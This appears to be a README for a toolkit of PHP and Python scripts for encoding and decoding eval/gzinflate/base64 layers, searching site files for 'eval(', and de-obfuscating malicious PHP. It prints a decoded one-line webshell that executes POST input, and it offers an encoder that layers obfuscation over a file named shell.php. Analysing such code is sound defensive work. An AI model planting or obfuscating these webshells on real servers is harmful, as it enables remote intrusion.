# smartscripts--ss

php实现代码压缩、编码，filename表示待处理文件，times表示操作次数<br/>
<b>base64encode-gzinflate.php</b>--->generate the file encode.shell.php with \<?php eval(gzinflate(base64_decode('---'))); ?\>;<br/>
example: http://xxx.xxx.xxx.xxx/smartscripts--ss/base64encode-gzinflate.php?times=5&filename=shell.php

<hr/>

php实现通过post代码进行解码、解压缩，支持经过多重压缩、编码的代码<br/>
post代码格式为：eval(gzinflate(base64_decode('---')));<br/>
<b>gzinflate-base64decode.php</b>--->post the code "eval(gzinflate(base64_decode('---')));"<br/>
example: http://xxx.xxx.xxx.xxx/smartscripts--ss/gzinflate-base64decode.php

<hr/>

python实现遍历匹配指定目录下所有文件的内容<br/>
input:<br/>
python <b>searchfiles.py</b><br/>
please input the root you want search: ./<br/>
please input the string you want search: eval(<br/>
output:<br/>
eval( in file ./configuration.php line: 1<br/>
eval( in file ./modules/mod_newEvent/helper.php line: 1<br/>
eval( in file ./logs/model.php line: 1<br/>
eval( in file ./logs/user.php line: 1<br/>
......

<hr/>

php实现通过echo重组通过数组字符串进行混淆的恶意代码<br/>
<b>phpmix-recover.php</b>-->recover the malicious script by echo function

<hr/>

python实现重组通过数组字符串进行混淆的恶意代码<br/>
input:<br/>
python <b>phpmix-recover.py</b>[空格]$l3e='b9Pvlit47fO(e\'Saq8sT_$88b749'[空格]if(isset(${$l3e[20].$l3e[2].$l3e[10].$l3e[14].$l3e[19]}[$l3e[16].$l3e[17].$l3e[17].$l3e[0].$l3e[8].$l3e[7].$l3e[1]])){eval(${$l3e[20].$l3e[2].$l3e[10].$l3e[14].$l3e[19]}[$l3e[16].$l3e[17].$l3e[17].$l3e[0].$l3e[8].$l3e[7].$l3e[1]])<br/>
output:<br/> 
if(isset(${_POST}[q88b749])){eval(${_POST}[q88b749])

<hr/>
